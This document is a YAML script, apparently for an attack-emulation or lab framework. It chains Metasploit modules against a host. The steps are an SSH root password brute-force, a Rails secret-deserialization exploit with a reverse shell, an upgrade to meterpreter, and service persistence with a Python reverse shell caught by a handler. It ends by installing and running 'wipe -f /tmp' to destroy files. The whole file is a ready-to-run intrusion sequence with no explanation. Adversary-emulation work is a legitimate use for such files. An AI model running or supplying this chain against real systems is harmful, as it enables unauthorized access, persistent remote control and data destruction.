commands:

  - type: msf-module
    cmd: "auxiliary/scanner/ssh/ssh_login"
    creates_session: ssh_login
    options:
      RHOSTS: "192.168.56.181"
      RPORT: "22"
      USERNAME: "root"
      PASS_FILE: "/home/ahnafrr/Desktop/msf/unix_passwords_modified.txt"
      
  - type: sleep
    seconds: 15
    description: "Sleep 15 seconds"

  - type: msf-module
    cmd: "exploit/multi/http/rails_secret_deserialization"
    payload: "ruby/shell_reverse_tcp"
    payload_options:
      LHOST: "192.168.56.191"
      LPORT: "4444"
    options:
      RHOSTS: "192.168.56.181"
      RPORT: "8181"
      TARGETURI: "/"
      SECRET: "a7aebc287bba0ee4e64f947415a94e5f"
      
  - type: msf-module
    cmd: "post/multi/manage/shell_to_meterpreter"
    session: ssh_login
    creates_session: meterpreter
      
  - type: sleep
    seconds: 15
    description: "Sleep 15 seconds"
    
  - type: msf-module
    cmd: "exploit/linux/local/service_persistence"
    payload: "cmd/unix/reverse_python"
    session: ssh_login
    creates_session: service_persistence
    payload_options:
      LHOST: "192.168.56.191"
    options:
      VERBOSE: "true"

  - type: msf-session
    session: "ssh_login"
    cmd: "exit"

  - type: msf-session
    session: "meterpreter"
    cmd: "exit"
 
  - type: sleep
    seconds: 15
    description: "Sleep 15 seconds"

  - type: msf-module
    cmd: "exploit/multi/handler"
    payload: "cmd/unix/reverse_python"
    session: service_persistence
    creates_session: handler_session
    payload_options:
      LHOST: "192.168.56.191"
    options:
      VERBOSE: "true"
      
  - type: sleep
    seconds: 15
    description: "Sleep 15 seconds"
    
  - type: msf-session
    cmd: "apt install wipe -y"
    session: handler_session
    
  - type: msf-session
    cmd: "wipe -f /tmp"
    session: handler_session